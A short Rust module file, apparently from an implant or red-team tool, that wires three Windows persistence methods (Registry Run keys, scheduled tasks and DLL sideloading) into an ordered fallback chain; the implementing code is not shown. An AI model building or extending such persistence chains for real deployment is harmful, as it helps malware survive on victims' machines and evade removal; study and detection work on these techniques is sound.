use crate::persistence::{PersistenceChain, PersistenceTrait};
pub mod registry;
pub mod scheduled_task;
pub mod dll_sideload;

pub fn get_chain() -> PersistenceChain {
    PersistenceChain::new(vec![
        Box::new(registry::RegistryRunPersistence),
        Box::new(scheduled_task::ScheduledTaskPersistence),
        Box::new(dll_sideload::DllSideloadPersistence),
    ])
}
